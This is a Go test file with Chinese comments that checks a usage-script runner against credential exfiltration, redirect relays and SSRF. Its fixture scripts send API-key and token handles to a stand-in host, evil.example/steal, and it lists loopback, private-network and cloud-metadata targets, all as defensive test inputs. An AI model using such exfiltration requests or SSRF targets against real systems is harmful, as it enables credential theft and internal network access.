package usagescript

import (
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"sync"
	"testing"

	"github.com/peterplaykkk/yzagmgr/internal/apierr"
)

// UC-016 修订版 A15/A16 的对抗夹具：凭据防外传（不透明引用 + 宿主侧代入）、
// 拒绝面可诊断、试运行全程无明文。证据形态按 UC：「公网外传和重定向桩测试」
// 与「合成秘密回显夹具扫描」。

// ── 夹具与扫描工具 ──────────────────────────────────────────────────────────

// assertNoPlaintext 深扫试运行结果：秘密与句柄不得出现在任何可展示/可留存面
// （request 的 url/headers/body、response 摘要、extracted、error）。
func assertNoPlaintext(t *testing.T, res TestResult, needles ...string) {
	t.Helper()
	blob, err := json.Marshal(struct {
		Request   RequestSpec     `json:"request"`
		Response  ResponseSummary `json:"response"`
		Extracted map[string]any  `json:"extracted"`
		Error     *ScriptError    `json:"error,omitempty"`
	}{res.Request, res.Response, res.Extracted, res.Error})
	if err != nil {
		t.Fatalf("序列化试运行结果失败: %v", err)
	}
	text := string(blob)
	for _, n := range needles {
		if n == "" {
			continue
		}
		if strings.Contains(text, n) {
			t.Fatalf("试运行结果里出现明文 %q：%s", n, text)
		}
	}
}

// testPolicyWith 在套件默认策略上追加额外目标（对抗用例的已批准面）。
func testPolicyWith(extraTargets ...string) Policy {
	p := testPolicy()
	p.Targets = append(p.Targets, extraTargets...)
	return p
}

// scriptedTransport 是跳转桩：逐跳应答，并记录**实际到达传输层**的请求。
// 「上游恶意接收端 0 请求」的判据就是它收到的请求条数。
type scriptedTransport struct {
	mu    sync.Mutex
	calls []*http.Request
	hop   func(req *http.Request) (*http.Response, error)
}

func (s *scriptedTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	s.mu.Lock()
	s.calls = append(s.calls, req)
	s.mu.Unlock()
	if s.hop != nil {
		return s.hop(req)
	}
	return okResponse(req), nil
}

func (s *scriptedTransport) count() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.calls)
}

func (s *scriptedTransport) requestAt(i int) *http.Request {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.calls[i]
}

func okResponse(req *http.Request) *http.Response {
	return &http.Response{
		StatusCode: http.StatusOK,
		Header:     http.Header{"Content-Type": []string{"application/json"}},
		Body:       io.NopCloser(strings.NewReader(`{"pct":42}`)),
		Request:    req,
	}
}

func redirectResponse(req *http.Request, target string) *http.Response {
	return &http.Response{
		StatusCode: http.StatusFound,
		Header:     http.Header{"Location": []string{target}},
		Body:       io.NopCloser(strings.NewReader("")),
		Request:    req,
	}
}

// ── A15：公网外传（句柄/秘密发往未授权域 ⇒ 0 出网） ─────────────────────────

func TestUsageScriptExfiltrationToPublicOriginIsBlocked(t *testing.T) {
	const secret = "sk-exfil-SECRET-7788990011"
	cases := []struct {
		name   string
		script string
	}{
		{
			"句柄放查询串发往公网域",
			`({ request: { method: "GET", url: "https://evil.example/steal?k={{apiKey}}" },
			    extract: { usedPercent: 1 } })`,
		},
		{
			"句柄放 Authorization 头发往公网域",
			`({ request: { method: "GET", url: "https://evil.example/steal",
			    headers: { "Authorization": "Bearer {{accessToken}}" } },
			    extract: { usedPercent: 1 } })`,
		},
		{
			"句柄放自定义头发往公网域",
			`({ request: { method: "GET", url: "https://evil.example/steal",
			    headers: { "X-Anything": "{{apiKey}}" } },
			    extract: { usedPercent: 1 } })`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ff := &fakeFetcher{}
			r := NewRunner(RunnerOptions{Fetcher: ff})
			res, err := r.Test(c.script, Vars{APIKey: secret, AccessToken: secret}, testPolicy())
			if err != nil {
				t.Fatalf("试运行返回错误: %v", err)
			}
			se := mustScriptCode(t, res.Error, apierr.CodeBlockedTarget)
			if se.Stage != StageRequest {
				t.Fatalf("stage=%s，期望 %s", se.Stage, StageRequest)
			}
			if len(ff.calls) != 0 {
				t.Fatalf("未授权域必须 0 出网，实际代发 %d 次", len(ff.calls))
			}
			if !strings.Contains(se.Message, "evil.example") {
				t.Fatalf("拒绝应可诊断（带来源 host）：%q", se.Message)
			}
			assertNoPlaintext(t, res, secret)
		})
	}

	// 硬编码的秘密同样拦下：脚本里出现明文令牌（例如用户把它粘进了脚本），
	// 目标合法也不得把它发出去。
	ff := &fakeFetcher{}
	r := NewRunner(RunnerOptions{Fetcher: ff})
	res, err := r.Test(
		`({ request: { method: "GET", url: "https://provider.example/usage?t=`+secret+`" },
		    extract: { usedPercent: 1 } })`,
		Vars{APIKey: secret}, testPolicy())
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	se := mustScriptCode(t, res.Error, apierr.CodeInvalidScriptShape)
	if se.Stage != StageRequest {
		t.Fatalf("stage=%s，期望 %s", se.Stage, StageRequest)
	}
	if len(ff.calls) != 0 {
		t.Fatalf("带明文秘密的请求必须 0 出网，实际代发 %d 次", len(ff.calls))
	}
	assertNoPlaintext(t, res, secret)
}

// ── A15：位置校验（URL/query/body/extract/非批准头） ────────────────────────

func TestUsageScriptCredentialPlacementIsEnforced(t *testing.T) {
	const secret = "sk-place-SECRET-5566778899"
	cases := []struct {
		name   string
		script string
	}{
		{
			"句柄放查询串（已批准域也不许）",
			`({ request: { method: "GET", url: "https://provider.example/usage?k={{apiKey}}" },
			    extract: { usedPercent: 1 } })`,
		},
		{
			"句柄放路径",
			`({ request: { method: "GET", url: "https://provider.example/usage/{{apiKey}}" },
			    extract: { usedPercent: 1 } })`,
		},
		{
			"句柄放请求体",
			`({ request: { method: "GET", url: "https://provider.example/usage", body: "token={{accessToken}}" },
			    extract: { usedPercent: 1 } })`,
		},
		{
			"句柄放提取规则",
			`({ request: { method: "GET", url: "https://provider.example/usage" },
			    extract: { usedPercent: 1, name: "{{apiKey}}" } })`,
		},
		{
			"句柄放非批准请求头",
			`({ request: { method: "GET", url: "https://provider.example/usage",
			    headers: { "X-Leak": "{{apiKey}}" } },
			    extract: { usedPercent: 1 } })`,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ff := &fakeFetcher{}
			r := NewRunner(RunnerOptions{Fetcher: ff})
			res, err := r.Test(c.script, Vars{APIKey: secret, AccessToken: secret}, testPolicy())
			if err != nil {
				t.Fatalf("试运行返回错误: %v", err)
			}
			se := mustScriptCode(t, res.Error, apierr.CodeInvalidScriptShape)
			if se.Stage != StageRequest {
				t.Fatalf("stage=%s，期望 %s（消息：%s）", se.Stage, StageRequest, se.Message)
			}
			if len(ff.calls) != 0 {
				t.Fatalf("放错位置的引用必须发送前拒绝，实际代发 %d 次", len(ff.calls))
			}
			assertNoPlaintext(t, res, secret)
		})
	}
}

// ── A15：只读闸门与凭据使用范围 ─────────────────────────────────────────────

func TestUsageScriptCredentialRefRequiresReadOnlyAndScope(t *testing.T) {
	const secret = "sk-scope-SECRET-1122334455"

	// 1) 非只读方法不得携带凭据引用（哪怕目标与位置都合法）。
	ff := &fakeFetcher{}
	r := NewRunner(RunnerOptions{Fetcher: ff})
	res, err := r.Test(`({ request: { method: "POST", url: "https://provider.example/usage",
	  headers: { "Authorization": "Bearer {{apiKey}}" }, body: "{}" },
	  extract: { usedPercent: 1 } })`, Vars{APIKey: secret}, testPolicy())
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	se := mustScriptCode(t, res.Error, apierr.CodeInvalidScriptShape)
	if !strings.Contains(se.Message, "只读") {
		t.Fatalf("拒绝应说明只读闸门：%q", se.Message)
	}
	if len(ff.calls) != 0 {
		t.Fatalf("非只读请求必须 0 出网，实际代发 %d 次", len(ff.calls))
	}

	// 2) 目标在白名单但不在凭据使用范围内：引用不得代入，也不得原样发出。
	policy := testPolicyWith("https://other.example")
	ff2 := &fakeFetcher{}
	r2 := NewRunner(RunnerOptions{Fetcher: ff2})
	res2, err := r2.Test(`({ request: { method: "GET", url: "https://other.example/usage",
	  headers: { "Authorization": "Bearer {{apiKey}}" } },
	  extract: { usedPercent: 1 } })`, Vars{APIKey: secret}, policy)
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	se2 := mustScriptCode(t, res2.Error, apierr.CodeBlockedTarget)
	if !strings.Contains(se2.Message, "凭据使用范围") {
		t.Fatalf("拒绝应说明凭据使用范围：%q", se2.Message)
	}
	if len(ff2.calls) != 0 {
		t.Fatalf("凭据范围外的请求必须 0 出网，实际代发 %d 次", len(ff2.calls))
	}
	assertNoPlaintext(t, res2, secret)

	// 3) 对照：同一脚本、目标换成凭据使用范围内的 origin ⇒ 代入并发出一份（且只此一份）。
	ff3 := &fakeFetcher{resp: Response{Status: 200, Body: `{"pct":42}`}}
	r3 := NewRunner(RunnerOptions{Fetcher: ff3})
	res3, err := r3.Test(`({ request: { method: "GET", url: "https://provider.example/usage",
	  headers: { "Authorization": "Bearer {{apiKey}}" } },
	  extract: { usedPercent: "$.pct" } })`, Vars{APIKey: secret}, policy)
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	mustNoErr(t, res3)
	if len(ff3.calls) != 1 {
		t.Fatalf("代发次数=%d，期望 1", len(ff3.calls))
	}
	if got, want := ff3.calls[0].Headers["Authorization"], "Bearer "+secret; got != want {
		t.Fatalf("出网 Authorization=%q，期望真实秘密代入 %q", got, want)
	}
	// 展示面仍是脱敏替身。
	if got, want := res3.Request.Headers["Authorization"], "Bearer "+MaskedSecret; got != want {
		t.Fatalf("展示面 Authorization=%q，期望 %q", got, want)
	}
	assertNoPlaintext(t, res3, secret)
}

// ── A5：localhost 不例外，本机管理口不是取数通道 ───────────────────────────

func TestUsageScriptLocalhostIsNeverExempt(t *testing.T) {
	// 1) 校验层：http 的 localhost baseUrl / 请求 URL 一律 invalid_url。
	if ae := ValidateBaseURL("http://localhost:8080/api"); ae == nil || ae.Code != apierr.CodeInvalidURL {
		t.Fatalf("http://localhost 的 baseUrl 必须被拒（不例外）: %v", ae)
	}
	if ae := ValidateRequestURL("http://127.0.0.1:9000/usage"); ae == nil || ae.Code != apierr.CodeInvalidURL {
		t.Fatalf("http://127.0.0.1 的请求必须被拒（不例外）: %v", ae)
	}

	// 2) 端到端：https 的 localhost / 回环 IP 请求被 SSRF 面拒绝，且 0 出网。
	for _, target := range []string{
		"https://localhost/usage",
		"https://127.0.0.1/usage",
		"https://127.0.0.1:17021/api/v1/tools", // 本机代理管理口
		"https://[::1]/usage",
	} {
		ff := &fakeFetcher{}
		r := NewRunner(RunnerOptions{Fetcher: ff})
		res, err := r.Test(`({ request: { method: "GET", url: "`+target+`" },
		  extract: { usedPercent: 1 } })`, Vars{}, testPolicy())
		if err != nil {
			t.Fatalf("试运行返回错误: %v", err)
		}
		se := mustScriptCode(t, res.Error, apierr.CodeBlockedTarget)
		if se.Stage != StageRequest {
			t.Fatalf("%s stage=%s，期望 %s", target, se.Stage, StageRequest)
		}
		if len(ff.calls) != 0 {
			t.Fatalf("%s 必须 0 出网，实际代发 %d 次", target, len(ff.calls))
		}
	}

	// 3) 即便 localhost 出现在「已批准」清单里也不放行（批准面不能覆盖 SSRF 面）。
	policy := Policy{Targets: []string{"https://localhost"}, CredentialOrigins: []string{"https://localhost"}}
	ff := &fakeFetcher{}
	r := NewRunner(RunnerOptions{Fetcher: ff})
	res, err := r.Test(`({ request: { method: "GET", url: "https://localhost/usage" },
	  extract: { usedPercent: 1 } })`, Vars{}, policy)
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	mustScriptCode(t, res.Error, apierr.CodeBlockedTarget)
	if len(ff.calls) != 0 {
		t.Fatalf("localhost 必须 0 出网，实际代发 %d 次", len(ff.calls))
	}
}

// ── A15：跳转逐跳校验（重定向桩；上游恶意接收端 0 请求） ────────────────────

func TestUsageScriptRedirectRelayToUnauthorizedOriginIsBlocked(t *testing.T) {
	// 第一跳（已批准 origin）302 → 未授权公网域。桩按 host 记录：到达 evil.example
	// 的任何请求都是「中继成功」，本测试断言它恒为 0。
	tr := &scriptedTransport{}
	var relayed int
	tr.hop = func(req *http.Request) (*http.Response, error) {
		if req.URL.Host == "evil.example" {
			relayed++
			return okResponse(req), nil
		}
		return redirectResponse(req, "https://evil.example/steal"), nil
	}
	r := NewRunner(RunnerOptions{
		Fetcher: &HTTPFetcher{Client: &http.Client{Transport: tr}},
	})
	res, err := r.Test(`({ request: { method: "GET", url: "https://provider.example/usage",
	  headers: { "Authorization": "Bearer {{apiKey}}" } },
	  extract: { usedPercent: 1 } })`, Vars{APIKey: "sk-redirect-SECRET-998877"}, testPolicy())
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	se := mustScriptCode(t, res.Error, apierr.CodeBlockedTarget)
	if se.Stage != StageRequest {
		t.Fatalf("stage=%s，期望 %s", se.Stage, StageRequest)
	}
	if relayed != 0 {
		t.Fatalf("未授权域收到了 %d 个请求（必须 0）", relayed)
	}
	if tr.count() != 1 {
		t.Fatalf("传输层请求数=%d，期望 1（只允许第一跳）", tr.count())
	}
	assertNoPlaintext(t, res, "sk-redirect-SECRET-998877")

	// 对照：跳到**已批准但不同 origin** 的域——守卫放行，但凭据头必须被剥掉
	// （秘密只发往它被批准的那一个 origin）。
	tr2 := &scriptedTransport{}
	tr2.hop = func(req *http.Request) (*http.Response, error) {
		if req.URL.Host == "mirror.example" {
			return okResponse(req), nil
		}
		return redirectResponse(req, "https://mirror.example/q"), nil
	}
	r2 := NewRunner(RunnerOptions{
		Fetcher: &HTTPFetcher{Client: &http.Client{Transport: tr2}},
	})
	res2, err := r2.Test(`({ request: { method: "GET", url: "https://provider.example/usage",
	  headers: { "Authorization": "Bearer {{apiKey}}", "X-Api-Key": "{{accessToken}}" } },
	  extract: { usedPercent: "$.pct" } })`,
		Vars{APIKey: "sk-redirect-SECRET-998877", AccessToken: "tok-redirect-SECRET-1234"},
		testPolicyWith("https://mirror.example"))
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	mustNoErr(t, res2)
	if tr2.count() != 2 {
		t.Fatalf("传输层请求数=%d，期望 2（原跳 + 批准清单内的跳转）", tr2.count())
	}
	if got := tr2.requestAt(0).Header.Get("Authorization"); got == "" {
		t.Fatalf("第一跳应携带代入后的凭据头")
	}
	// X-Api-Key 是自定义头：Go 的客户端不会自动剥它，靠本包的跨 origin 剥离。
	if got := tr2.requestAt(1).Header.Get("X-Api-Key"); got != "" {
		t.Fatalf("跨 origin 跳转不得中继自定义凭据头，实际 %q", got)
	}
	if got := tr2.requestAt(1).Header.Get("Authorization"); got != "" {
		t.Fatalf("跨 origin 跳转不得中继凭据头，实际 %q", got)
	}
}

// ── A15：跳转守卫的单元面（逐跳判定） ──────────────────────────────────────

func TestUsageScriptRedirectGuardChecksEveryHop(t *testing.T) {
	policy := testPolicy()
	guard := func(raw string) error {
		if ae := policy.checkTarget(raw); ae != nil {
			return ae
		}
		return nil
	}
	// 已批准域：放行。
	if err := guard("https://provider.example/usage"); err != nil {
		t.Fatalf("已批准域被拒: %v", err)
	}
	// 未授权公网域：拒绝。
	if err := guard("https://evil.example/steal"); err == nil {
		t.Fatalf("未授权域必须被拒")
	}
	// 内网/元数据/回环：拒绝。
	for _, raw := range []string{
		"https://169.254.169.254/latest/meta-data/",
		"https://localhost/x",
		"https://10.0.0.1/x",
	} {
		if err := guard(raw); err == nil {
			t.Fatalf("%s 必须被拒", raw)
		}
	}
	// 非 https：拒绝。
	if err := guard("http://provider.example/usage"); err == nil {
		t.Fatalf("非 https 跳转必须被拒")
	}
}

// ── A16：合成秘密回显夹具（供应商把秘密回显回来也不进入任何面） ─────────────

func TestUsageScriptDryRunResponseIsMasked(t *testing.T) {
	const secret = "sk-echo-SECRET-0011223344"
	const access = "tok-echo-SECRET-5566778899"
	// 恶意/唠叨的供应商：把收到的凭据原样回显在响应正文里（多种形状）。
	body := `{"pct":42,"echo":"` + secret + `","headers":{"auth":"Bearer ` + access + `"}}`
	ff := &fakeFetcher{resp: Response{Status: 200, Body: body}}
	r := NewRunner(RunnerOptions{Fetcher: ff})
	res, err := r.Test(`({ request: { method: "GET", url: "https://provider.example/usage",
	  headers: { "Authorization": "Bearer {{apiKey}}", "X-Api-Key": "{{accessToken}}" } },
	  extract: { usedPercent: "$.pct", name: "$.echo", note: "$.headers.auth" } })`,
		Vars{APIKey: secret, AccessToken: access}, testPolicy())
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	if res.Error != nil {
		t.Fatalf("该夹具应成功（响应只是带回了秘密）: %+v", res.Error)
	}
	// 响应摘要脱敏，但额度数字仍照实提取。
	if !strings.Contains(res.Response.BodyExcerpt, MaskedSecret) {
		t.Fatalf("响应摘要应带脱敏替身: %q", res.Response.BodyExcerpt)
	}
	if got := res.Extracted["usedPercent"]; got == nil || got.(interface{ String() string }).String() != "42" {
		t.Fatalf("usedPercent=%v，期望 42", got)
	}
	if got, want := res.Extracted["name"], MaskedSecret; got != want {
		t.Fatalf("被回显的秘密必须以脱敏替身进入提取结果: %v", got)
	}
	if got, want := res.Extracted["note"], "Bearer "+MaskedSecret; got != want {
		t.Fatalf("被回显的秘密（头形态）必须以脱敏替身进入提取结果: %v", got)
	}
	// 全量扫描：秘密、句柄、秘密的片段都不在任何可展示面。
	assertNoPlaintext(t, res, secret, access)
	// 出网请求本身仍带着真实秘密（代入成立）；这次回显就源于它。
	if len(ff.calls) != 1 || ff.calls[0].Headers["Authorization"] != "Bearer "+secret {
		t.Fatalf("代入面不符合预期: %+v", ff.calls)
	}

	// 被拒绝的运行同样无明文：句柄出现在被拒请求里时，展示面必须是替身。
	ff2 := &fakeFetcher{}
	r2 := NewRunner(RunnerOptions{Fetcher: ff2})
	res2, err := r2.Test(`({ request: { method: "GET", url: "https://provider.example/usage?k={{apiKey}}" },
	  extract: { usedPercent: 1 } })`, Vars{APIKey: secret}, testPolicy())
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	if res2.Error == nil {
		t.Fatalf("该请求必须被拒")
	}
	if !strings.Contains(res2.Request.URL, MaskedSecret) {
		t.Fatalf("被拒请求的 URL 展示应带脱敏替身: %q", res2.Request.URL)
	}
	assertNoPlaintext(t, res2, secret, handlePrefix)
}

// ── 凭据使用范围记录（试运行展示用） ───────────────────────────────────────

func TestUsageScriptCredentialScopeIsRecorded(t *testing.T) {
	policy := testPolicyWith("https://other.example")
	ff := &fakeFetcher{resp: Response{Status: 200, Body: `{"pct":1}`}}
	r := NewRunner(RunnerOptions{Fetcher: ff})
	res, err := r.Test(okScript, Vars{APIKey: "sk-scope-record-1234"}, policy)
	if err != nil {
		t.Fatalf("试运行返回错误: %v", err)
	}
	scope := res.CredentialScope
	if len(scope.Origins) != 1 || scope.Origins[0] != "https://provider.example" {
		t.Fatalf("凭据使用范围 origins=%v，期望仅 provider.example（凭据只属于它的登记 origin）", scope.Origins)
	}
	if len(scope.Headers) == 0 || !credentialHeaderAllowed(scope.Headers[0]) {
		t.Fatalf("凭据使用范围 headers=%v，期望批准位置清单", scope.Headers)
	}
	if len(scope.Methods) != 2 || scope.Methods[0] != "GET" || scope.Methods[1] != "HEAD" {
		t.Fatalf("凭据使用范围 methods=%v，期望只读方法", scope.Methods)
	}
	// 上线形（包内 DTO 的冻结形状不受影响；由 API 层按需上线）。
	blob, err := json.Marshal(res)
	if err != nil {
		t.Fatalf("序列化失败: %v", err)
	}
	if strings.Contains(string(blob), "credentialScope") {
		t.Fatalf("本包 DTO 不应出现 credentialScope 键: %s", blob)
	}
}
